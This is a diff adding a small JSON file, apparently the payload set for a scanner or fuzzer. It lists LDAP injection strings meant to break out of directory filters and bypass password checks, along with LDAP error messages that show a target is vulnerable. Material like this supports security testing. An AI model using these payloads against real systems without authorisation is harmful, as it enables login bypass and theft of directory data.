@@ -1,0 +1,21 @@
+{
+  "payloads": [
+    "*",
+    "*)(uid=*",
+    "admin*",
+    "admin)(&(password=*",
+    "*)(|(uid=*",
+    "*)(&(objectClass=*",
+    "*))%00",
+    "admin)(|(password=*",
+    "*)(cn=*)(|(cn=*"
+  ],
+  "error_indicators": [
+    "javax.naming.NameNotFoundException",
+    "LDAPException",
+    "com.sun.jndi.ldap",
+    "[LDAP:",
+    "Invalid DN syntax",
+    "LDAP: error code"
+  ]
+}
